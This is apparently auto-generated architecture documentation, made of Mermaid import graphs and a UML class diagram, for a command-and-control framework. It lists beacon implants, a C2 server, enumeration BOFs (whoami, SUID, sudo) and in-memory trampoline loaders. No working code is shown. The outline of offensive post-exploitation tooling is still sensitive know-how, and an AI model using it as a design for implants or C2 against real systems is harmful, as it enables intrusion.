    beacons_v1_gopher_beacon_c -.->|imports| ext_netinet_in_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_arpa_inet_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_net_if_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_sys_ioctl_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_pwd_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_errno_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_openssl_buffer_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_openssl_rand_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_sys_mman_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_elf_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_dlfcn_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_fcntl_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_stdint_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_sys_wait_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_stdarg_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_netdb_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_beacon_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_aes_h
    beacons_v1_gopher_beacon_c -.->|imports| ext_cJSON_h
    beacons_v2_beacon_c -.->|imports| ext_stdio_h
    beacons_v2_beacon_c -.->|imports| ext_stdlib_h
    beacons_v2_beacon_c -.->|imports| ext_string_h
    beacons_v2_beacon_c -.->|imports| ext_unistd_h
    beacons_v2_beacon_c -.->|imports| ext_time_h
    beacons_v2_beacon_c -.->|imports| ext_pwd_h
    beacons_v2_beacon_c -.->|imports| ext_pthread_h
    beacons_v2_beacon_c -.->|imports| ext_sys_socket_h
    beacons_v2_beacon_c -.->|imports| ext_netinet_in_h
    beacons_v2_beacon_c -.->|imports| ext_arpa_inet_h
    beacons_v2_beacon_c -.->|imports| ext_openssl_rand_h
    beacons_v2_beacon_c -.->|imports| ext_beacon_common_h
    beacons_v2_beacon_c -.->|imports| ext_cJSON_h
    beacons_v3_beacon_c -.->|imports| ext_stdio_h
    beacons_v3_beacon_c -.->|imports| ext_stdlib_h
    beacons_v3_beacon_c -.->|imports| ext_string_h
    beacons_v3_beacon_c -.->|imports| ext_unistd_h
    beacons_v3_beacon_c -.->|imports| ext_time_h
    beacons_v3_beacon_c -.->|imports| ext_pwd_h
    beacons_v3_beacon_c -.->|imports| ext_openssl_rand_h
    beacons_v3_beacon_c -.->|imports| ext_beacon_common_h
    beacons_v3_beacon_c -.->|imports| ext_cJSON_h
    ext_beacon_api_h["beacon_api.h"]
    class ext_beacon_api_h ext;
    bof_cat_bof_c -.->|imports| ext_beacon_api_h
    ext_syscalls_h["syscalls.h"]
    class ext_syscalls_h ext;
    bof_cat_bof_c -.->|imports| ext_syscalls_h
    bof_include_beacon_api_h -.->|imports| ext_stdint_h
    bof_include_beacon_api_h -.->|imports| ext_stddef_h
    bof_include_beacon_api_h -.->|imports| ext_stdarg_h
    bof_include_syscalls_h -.->|imports| ext_stddef_h
    bof_is_sudo_bof_c -.->|imports| ext_beacon_api_h
    bof_is_sudo_bof_c -.->|imports| ext_syscalls_h
    bof_suid_enum_bof_c -.->|imports| ext_beacon_api_h
    bof_suid_enum_bof_c -.->|imports| ext_syscalls_h
    bof_userenum_bof_c -.->|imports| ext_beacon_api_h
    bof_userenum_bof_c -.->|imports| ext_syscalls_h
    bof_whoami_bof_c -.->|imports| ext_beacon_api_h
    bof_whoami_bof_c -.->|imports| ext_syscalls_h
    bof_c -.->|imports| ext_beacon_h
    ext_base64["base64"]
    class ext_base64 ext;
    c2_server_py -.->|imports| ext_base64
    ext_csv["csv"]
    class ext_csv ext;
    c2_server_py -.->|imports| ext_csv
    ext_hashlib["hashlib"]
    class ext_hashlib ext;
    c2_server_py -.->|imports| ext_hashlib
    ext_hmac["hmac"]
    class ext_hmac ext;
    c2_server_py -.->|imports| ext_hmac
    ext_json["json"]
    class ext_json ext;
    c2_server_py -.->|imports| ext_json
    ext_logging["logging"]
    class ext_logging ext;
    c2_server_py -.->|imports| ext_logging
    c2_server_py -.->|imports| ext_os
    ext_socket["socket"]
    class ext_socket ext;
    c2_server_py -.->|imports| ext_socket
    ext_sys["sys"]
    class ext_sys ext;
    c2_server_py -.->|imports| ext_sys
    ext_threading["threading"]
    class ext_threading ext;
    c2_server_py -.->|imports| ext_threading
    ext_time["time"]
    class ext_time ext;
    c2_server_py -.->|imports| ext_time
    ext_concurrent_futures["concurrent.futures"]
    class ext_concurrent_futures ext;
    c2_server_py -.->|imports| ext_concurrent_futures
    ext_pathlib["pathlib"]
    class ext_pathlib ext;
    c2_server_py -.->|imports| ext_pathlib
    ext_typing["typing"]
    class ext_typing ext;
    c2_server_py -.->|imports| ext_typing
    ext_cryptography_hazmat_primitives_ciphers["cryptography.hazmat.primitives.ciphers"]
    class ext_cryptography_hazmat_primitives_ciphers ext;
    c2_server_py -.->|imports| ext_cryptography_hazmat_primitives_ciphers
    ext_cryptography_hazmat_backends["cryptography.hazmat.backends"]
    class ext_cryptography_hazmat_backends ext;
    c2_server_py -.->|imports| ext_cryptography_hazmat_backends
    ext_config_py["config_py"]
    class ext_config_py ext;
    c2_server_py -.->|imports| ext_config_py
    cJSON_c -.->|imports| ext_string_h
    cJSON_c -.->|imports| ext_stdio_h
    ext_math_h["math.h"]
    class ext_math_h ext;
    cJSON_c -.->|imports| ext_math_h
    cJSON_c -.->|imports| ext_stdlib_h
    ext_limits_h["limits.h"]
    class ext_limits_h ext;
    cJSON_c -.->|imports| ext_limits_h
    ext_ctype_h["ctype.h"]
    class ext_ctype_h ext;
    cJSON_c -.->|imports| ext_ctype_h
    ext_float_h["float.h"]
    class ext_float_h ext;
    cJSON_c -.->|imports| ext_float_h
    ext_locale_h["locale.h"]
    class ext_locale_h ext;
    cJSON_c -.->|imports| ext_locale_h
    cJSON_c -.->|imports| ext_cJSON_h
    cJSON_h -.->|imports| ext_stddef_h
    gopher_beacon_c -.->|imports| ext_stdio_h
    gopher_beacon_c -.->|imports| ext_stdlib_h
    gopher_beacon_c -.->|imports| ext_string_h
    gopher_beacon_c -.->|imports| ext_unistd_h
    gopher_beacon_c -.->|imports| ext_time_h
    gopher_beacon_c -.->|imports| ext_sys_types_h
    gopher_beacon_c -.->|imports| ext_sys_socket_h
    gopher_beacon_c -.->|imports| ext_netinet_in_h
    gopher_beacon_c -.->|imports| ext_arpa_inet_h
    gopher_beacon_c -.->|imports| ext_net_if_h
    gopher_beacon_c -.->|imports| ext_sys_ioctl_h
    gopher_beacon_c -.->|imports| ext_pwd_h
    gopher_beacon_c -.->|imports| ext_errno_h
    gopher_beacon_c -.->|imports| ext_openssl_buffer_h
    gopher_beacon_c -.->|imports| ext_openssl_rand_h
    gopher_beacon_c -.->|imports| ext_sys_mman_h
    gopher_beacon_c -.->|imports| ext_elf_h
    gopher_beacon_c -.->|imports| ext_dlfcn_h
    gopher_beacon_c -.->|imports| ext_fcntl_h
    gopher_beacon_c -.->|imports| ext_stdint_h
    gopher_beacon_c -.->|imports| ext_sys_wait_h
    gopher_beacon_c -.->|imports| ext_stdarg_h
    gopher_beacon_c -.->|imports| ext_netdb_h
    gopher_beacon_c -.->|imports| ext_beacon_h
    gopher_beacon_c -.->|imports| ext_aes_h
    gopher_beacon_c -.->|imports| ext_cJSON_h
    gopher_c2_py -.->|imports| ext_socket
    gopher_c2_py -.->|imports| ext_threading
    gopher_c2_py -.->|imports| ext_base64
    gopher_c2_py -.->|imports| ext_json
    gopher_c2_py -.->|imports| ext_os
    gopher_c2_py -.->|imports| ext_logging
    ext_datetime["datetime"]
    class ext_datetime ext;
    gopher_c2_py -.->|imports| ext_datetime
    gopher_c2_py -.->|imports| ext_cryptography_hazmat_primitives_ciphers
    gopher_c2_py -.->|imports| ext_cryptography_hazmat_backends
    gopher_c2_py -.->|imports| ext_csv
    include_aes_c -.->|imports| ext_aes_h
    include_aes_c -.->|imports| ext_string_h
    include_aes_h -.->|imports| ext_stdint_h
    include_aes_h -.->|imports| ext_stddef_h
    include_aes_cfb_c -.->|imports| ext_aes_h
    include_aes_cfb_c -.->|imports| ext_stdlib_h
    include_aes_cfb_c -.->|imports| ext_string_h
    include_aes_cfb_h -.->|imports| ext_stddef_h
    include_beacon_h -.->|imports| ext_stdint_h
    include_beacon_h -.->|imports| ext_stdarg_h
    include_beacon_common_c -.->|imports| ext_beacon_common_h
    include_beacon_common_c -.->|imports| ext_aes_h
    include_beacon_common_c -.->|imports| ext_cJSON_h
    include_beacon_common_c -.->|imports| ext_stdio_h
    include_beacon_common_c -.->|imports| ext_stdlib_h
    include_beacon_common_c -.->|imports| ext_string_h
    include_beacon_common_c -.->|imports| ext_unistd_h
    include_beacon_common_c -.->|imports| ext_sys_mman_h
    include_beacon_common_c -.->|imports| ext_sys_wait_h
    include_beacon_common_c -.->|imports| ext_elf_h
    include_beacon_common_c -.->|imports| ext_dlfcn_h
    include_beacon_common_c -.->|imports| ext_fcntl_h
    include_beacon_common_c -.->|imports| ext_stdarg_h
    include_beacon_common_c -.->|imports| ext_netdb_h
    include_beacon_common_c -.->|imports| ext_sys_socket_h
    include_beacon_common_c -.->|imports| ext_netinet_in_h
    include_beacon_common_c -.->|imports| ext_arpa_inet_h
    include_beacon_common_c -.->|imports| ext_net_if_h
    include_beacon_common_c -.->|imports| ext_sys_ioctl_h
    include_beacon_common_c -.->|imports| ext_curl_curl_h
    include_beacon_common_c -.->|imports| ext_openssl_rand_h
    include_beacon_common_c -.->|imports| ext_openssl_bio_h
    include_beacon_common_c -.->|imports| ext_openssl_buffer_h
    ext_openssl_hmac_h["hmac.h"]
    class ext_openssl_hmac_h ext;
    include_beacon_common_c -.->|imports| ext_openssl_hmac_h
    include_beacon_common_h -.->|imports| ext_stddef_h
    include_beacon_common_h -.->|imports| ext_stdint_h
    include_beacon_common_h -.->|imports| ext_sys_types_h
    ext_config_h["config.h"]
    class ext_config_h ext;
    include_beacon_common_h -.->|imports| ext_config_h
    include_cJSON_c -.->|imports| ext_string_h
    include_cJSON_c -.->|imports| ext_stdio_h
    include_cJSON_c -.->|imports| ext_math_h
    include_cJSON_c -.->|imports| ext_stdlib_h
    include_cJSON_c -.->|imports| ext_limits_h
    include_cJSON_c -.->|imports| ext_ctype_h
    include_cJSON_c -.->|imports| ext_float_h
    include_cJSON_c -.->|imports| ext_locale_h
    include_cJSON_c -.->|imports| ext_cJSON_h
    include_cJSON_h -.->|imports| ext_stddef_h
    include_config_c -.->|imports| ext_config_h
    include_config_c -.->|imports| ext_stdio_h
    include_config_c -.->|imports| ext_stdlib_h
    include_config_c -.->|imports| ext_string_h
    include_config_c -.->|imports| ext_ctype_h
    include_config_c -.->|imports| ext_time_h
    include_config_c -.->|imports| ext_unistd_h
    include_config_c -.->|imports| ext_limits_h
    include_config_h -.->|imports| ext_stdint_h
    include_config_h -.->|imports| ext_stddef_h
    include_config_py_py -.->|imports| ext_json
    include_config_py_py -.->|imports| ext_os
    ext_re["re"]
    class ext_re ext;
    include_config_py_py -.->|imports| ext_re
    include_config_py_py -.->|imports| ext_sys
    include_config_py_py -.->|imports| ext_pathlib
    tests_config_harness_c -.->|imports| ext_config_h
    tests_config_harness_c -.->|imports| ext_stdio_h
    tests_config_harness_c -.->|imports| ext_stdlib_h
    tests_config_harness_c -.->|imports| ext_string_h
    ext_aes_cfb_h["aes_cfb.h"]
    class ext_aes_cfb_h ext;
    tests_crypto_harness_c -.->|imports| ext_aes_cfb_h
    tests_crypto_harness_c -.->|imports| ext_stdio_h
    tests_crypto_harness_c -.->|imports| ext_stdlib_h
    tests_crypto_harness_c -.->|imports| ext_string_h
    tests_test_beacon_build_py -.->|imports| ext_os
    ext_shutil["shutil"]
    class ext_shutil ext;
    tests_test_beacon_build_py -.->|imports| ext_shutil
    ext_subprocess["subprocess"]
    class ext_subprocess ext;
    tests_test_beacon_build_py -.->|imports| ext_subprocess
    tests_test_beacon_build_py -.->|imports| ext_sys
    tests_test_beacon_build_py -.->|imports| ext_pathlib
    tests_test_bof_compile_py -.->|imports| ext_os
    tests_test_bof_compile_py -.->|imports| ext_re
    tests_test_bof_compile_py -.->|imports| ext_subprocess
    tests_test_bof_compile_py -.->|imports| ext_sys
    tests_test_bof_compile_py -.->|imports| ext_pathlib
    tests_test_c2_http_e2e_py -.->|imports| ext_base64
    tests_test_c2_http_e2e_py -.->|imports| ext_json
    tests_test_c2_http_e2e_py -.->|imports| ext_os
    tests_test_c2_http_e2e_py -.->|imports| ext_socket
    tests_test_c2_http_e2e_py -.->|imports| ext_sys
    ext_tempfile["tempfile"]
    class ext_tempfile ext;
    tests_test_c2_http_e2e_py -.->|imports| ext_tempfile
    tests_test_c2_http_e2e_py -.->|imports| ext_threading
    tests_test_c2_http_e2e_py -.->|imports| ext_time
    tests_test_c2_http_e2e_py -.->|imports| ext_pathlib
    ext_c2["c2"]
    class ext_c2 ext;
    tests_test_c2_http_e2e_py -.->|imports| ext_c2
    tests_test_c2_http_e2e_py -.->|imports| ext_cryptography_hazmat_primitives_ciphers
    tests_test_c2_http_e2e_py -.->|imports| ext_cryptography_hazmat_backends
    tests_test_c2_http_e2e_py -.->|imports| ext_tempfile
    tests_test_c2_http_e2e_py -.->|imports| ext_cryptography_hazmat_primitives_ciphers
    tests_test_c2_http_e2e_py -.->|imports| ext_cryptography_hazmat_backends
    tests_test_c2_http_e2e_py -.->|imports| ext_tempfile
    tests_test_c2_http_e2e_py -.->|imports| ext_cryptography_hazmat_primitives_ciphers
    tests_test_c2_http_e2e_py -.->|imports| ext_cryptography_hazmat_backends
    tests_test_c2_http_e2e_py -.->|imports| ext_tempfile
    tests_test_c2_http_e2e_py -.->|imports| ext_cryptography_hazmat_primitives_ciphers
    tests_test_c2_http_e2e_py -.->|imports| ext_cryptography_hazmat_backends
    tests_test_c2_http_e2e_py -.->|imports| ext_tempfile
    tests_test_c2_http_e2e_py -.->|imports| ext_cryptography_hazmat_primitives_ciphers
    tests_test_c2_http_e2e_py -.->|imports| ext_cryptography_hazmat_backends
    tests_test_c2_server_py -.->|imports| ext_base64
    tests_test_c2_server_py -.->|imports| ext_json
    tests_test_c2_server_py -.->|imports| ext_os
    tests_test_c2_server_py -.->|imports| ext_shutil
    tests_test_c2_server_py -.->|imports| ext_sys
    tests_test_c2_server_py -.->|imports| ext_tempfile
    tests_test_c2_server_py -.->|imports| ext_time
    tests_test_c2_server_py -.->|imports| ext_pathlib
    ext_c2_server["c2.server"]
    class ext_c2_server ext;
    tests_test_c2_server_py -.->|imports| ext_c2_server
    tests_test_config_py -.->|imports| ext_json
    tests_test_config_py -.->|imports| ext_os
    tests_test_config_py -.->|imports| ext_shutil
    tests_test_config_py -.->|imports| ext_subprocess
    tests_test_config_py -.->|imports| ext_sys
    tests_test_config_py -.->|imports| ext_tempfile
    tests_test_config_py -.->|imports| ext_pathlib
    tests_test_config_py -.->|imports| ext_shutil
    tests_test_crypto_py -.->|imports| ext_os
    tests_test_crypto_py -.->|imports| ext_subprocess
    tests_test_crypto_py -.->|imports| ext_sys
    tests_test_crypto_py -.->|imports| ext_pathlib
    tests_test_crypto_py -.->|imports| ext_base64
    tests_test_crypto_py -.->|imports| ext_sys
    tests_test_crypto_py -.->|imports| ext_pathlib
    tests_test_crypto_py -.->|imports| ext_cryptography_hazmat_primitives_ciphers
    tests_test_crypto_py -.->|imports| ext_cryptography_hazmat_backends
    tests_test_install_deploy_py -.->|imports| ext_os
    tests_test_install_deploy_py -.->|imports| ext_shutil
    ext_stat["stat"]
    class ext_stat ext;
    tests_test_install_deploy_py -.->|imports| ext_stat
    tests_test_install_deploy_py -.->|imports| ext_subprocess
    tests_test_install_deploy_py -.->|imports| ext_sys
    tests_test_install_deploy_py -.->|imports| ext_tempfile
    tests_test_install_deploy_py -.->|imports| ext_pathlib
```

---

## UML Class Diagram

Auto-generated Mermaid class diagram from parsed class-level symbols. Shows classes, structs, interfaces, traits, and their methods with inheritance and dependency relationships.

```mermaid
classDiagram
  class aes_h_AES_ctx {
    <<struct>>
    +AES_init_ctx(struct AES_ctx* ctx, const uint8_t* key);
    +AES_init_ctx_iv(struct AES_ctx* ctx, const uint8_t* key, const uint8_t* iv);
    +AES_ctx_set_iv(struct AES_ctx* ctx, const uint8_t* iv);
    +AES_ECB_encrypt(const struct AES_ctx* ctx, uint8_t* buf);
    +AES_ECB_decrypt(const struct AES_ctx* ctx, uint8_t* buf);
    +AES_CBC_encrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
    +AES_CBC_decrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
    +AES_CTR_xcrypt_buffer(struct AES_ctx* ctx, uint8_t* buf, size_t length);
  }
  class beacon_h_datap {
    <<struct>>
    +BeaconDataParse(datap *parser, char *buffer, int size);
    +BeaconDataPtr(datap *parser, int size);
    +BeaconDataInt(datap *parser);
    +BeaconDataShort(datap *parser);
    +BeaconDataLength(datap *parser);
    +BeaconDataExtract(datap *parser, int *size);
    +BeaconPrintf(int type, const char *fmt, ...);
    +BeaconOutput(int type, const char *data, int len);
  }
  class beacon3_c_MemoryStruct {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const char* url, const char* method, const char* post_data)
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon3_c_Trampoline {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const char* url, const char* method, const char* post_data)
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon3_c_SymbolResolver {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const char* url, const char* method, const char* post_data)
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon3_c_TrampolineCache {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const char* url, const char* method, const char* post_data)
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon5_c_MemoryStruct {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const char* url, const char* method, const char* post_data)
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon5_c_peer_t {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const char* url, const char* method, const char* post_data)
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon5_c_mesh_msg_t {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const char* url, const char* method, const char* post_data)
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon5_c_Trampoline {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const char* url, const char* method, const char* post_data)
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon5_c_SymbolResolver {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const char* url, const char* method, const char* post_data)
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon5_c_TrampolineCache {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +https_request(const char* url, const char* method, const char* post_data)
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon6_c_MemoryStruct {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +delay_ms(int ms)
    +is_prime(unsigned int x)
    +get_nth_prime_limited(unsigned int n)
    +portable_rand_19k_29k(void)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
  }
  class beacon6_c_Trampoline {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +delay_ms(int ms)
    +is_prime(unsigned int x)
    +get_nth_prime_limited(unsigned int n)
    +portable_rand_19k_29k(void)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
  }
  class beacon6_c_SymbolResolver {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +delay_ms(int ms)
    +is_prime(unsigned int x)
    +get_nth_prime_limited(unsigned int n)
    +portable_rand_19k_29k(void)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
  }
  class beacon6_c_TrampolineCache {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +delay_ms(int ms)
    +is_prime(unsigned int x)
    +get_nth_prime_limited(unsigned int n)
    +portable_rand_19k_29k(void)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
  }
  class beacon_p2p_c_MemoryStruct {
    <<struct>>
    +BeaconDataParse(datap *parser, char *buffer, int size)
    +BeaconDataPtr(datap *parser, int size)
    +BeaconDataInt(datap *parser)
    +BeaconDataShort(datap *parser)
    +BeaconDataLength(datap *parser)
    +BeaconDataExtract(datap *parser, int *size)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +create_trampoline(void* target)
  }
  class beacon_p2p_c_peer_t {
    <<struct>>
    +BeaconDataParse(datap *parser, char *buffer, int size)
    +BeaconDataPtr(datap *parser, int size)
    +BeaconDataInt(datap *parser)
    +BeaconDataShort(datap *parser)
    +BeaconDataLength(datap *parser)
    +BeaconDataExtract(datap *parser, int *size)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +create_trampoline(void* target)
  }
  class beacon_p2p_c_p2p_header_t {
    <<struct>>
    +BeaconDataParse(datap *parser, char *buffer, int size)
    +BeaconDataPtr(datap *parser, int size)
    +BeaconDataInt(datap *parser)
    +BeaconDataShort(datap *parser)
    +BeaconDataLength(datap *parser)
    +BeaconDataExtract(datap *parser, int *size)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +create_trampoline(void* target)
  }
  class beacon_p2p_c_Trampoline {
    <<struct>>
    +BeaconDataParse(datap *parser, char *buffer, int size)
    +BeaconDataPtr(datap *parser, int size)
    +BeaconDataInt(datap *parser)
    +BeaconDataShort(datap *parser)
    +BeaconDataLength(datap *parser)
    +BeaconDataExtract(datap *parser, int *size)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +create_trampoline(void* target)
  }
  class beacon_p2p_c_SymbolResolver {
    <<struct>>
    +BeaconDataParse(datap *parser, char *buffer, int size)
    +BeaconDataPtr(datap *parser, int size)
    +BeaconDataInt(datap *parser)
    +BeaconDataShort(datap *parser)
    +BeaconDataLength(datap *parser)
    +BeaconDataExtract(datap *parser, int *size)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +create_trampoline(void* target)
  }
  class beacon_p2p_c_TrampolineCache {
    <<struct>>
    +BeaconDataParse(datap *parser, char *buffer, int size)
    +BeaconDataPtr(datap *parser, int size)
    +BeaconDataInt(datap *parser)
    +BeaconDataShort(datap *parser)
    +BeaconDataLength(datap *parser)
    +BeaconDataExtract(datap *parser, int *size)
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +create_trampoline(void* target)
  }
  class gopher_beacon_c_MemoryStruct {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +gopher_request(const char* host, int port, const char* selector, const char* method, const ...
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class gopher_beacon_c_Trampoline {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +gopher_request(const char* host, int port, const char* selector, const char* method, const ...
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class gopher_beacon_c_SymbolResolver {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +gopher_request(const char* host, int port, const char* selector, const char* method, const ...
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class gopher_beacon_c_TrampolineCache {
    <<struct>>
    +__attribute__((noinline))
call_bof_isolated(bof_func_t func, char* args, uintptr_t ar...
    +BeaconPrintf(int type, const char *fmt, ...)
    +BeaconOutput(int type, const char *data, int len)
    +create_trampoline(void* target)
    +cleanup_trampolines(void)
    +get_or_create_trampoline(void* target)
    +WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
    +gopher_request(const char* host, int port, const char* selector, const char* method, const ...
    +base64_encode(const unsigned char* input, int len)
    +base64_decode(const char* input, int* len)
  }
  class beacon_c_peer_t {
    <<struct>>
    +report_result(const bsb_config_t *cfg,
                           const char *command...
